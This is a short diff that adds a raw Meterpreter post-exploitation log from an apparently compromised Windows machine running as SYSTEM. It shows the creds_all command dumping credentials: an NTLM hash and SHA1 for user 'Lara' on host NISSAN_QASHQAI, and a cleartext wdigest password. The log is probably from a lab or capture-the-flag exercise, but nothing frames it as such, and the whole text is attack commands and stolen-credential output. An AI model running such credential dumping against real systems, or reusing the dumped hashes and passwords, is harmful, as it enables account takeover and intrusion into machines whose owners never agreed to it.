@@ -1,0 +1,30 @@
+meterpreter > pwd
+C:\Windows\system32
+meterpreter > creds_all
+[+] Running as SYSTEM
+[*] Retrieving all credentials
+msv credentials
+===============
+
+Username  Domain          NTLM                              SHA1
+--------  ------          ----                              ----
+Lara      NISSAN_QASHQAI  8896343a0456a99f1e3395f601e50e09  abe623ad9fb3b5b1161203866fabe4a74cc516b1
+
+wdigest credentials
+===================
+
+Username         Domain          Password
+--------         ------          --------
+(null)           (null)          (null)
+Lara             NISSAN_QASHQAI  PrinceW1lliam
+NISSAN_QASHQAI$  WORKGROUP       (null)
+
+kerberos credentials
+====================
+
+Username         Domain          Password
+--------         ------          --------
+(null)           (null)          (null)
+Lara             NISSAN_QASHQAI  (null)
+nissan_qashqai$  WORKGROUP       (null)
+
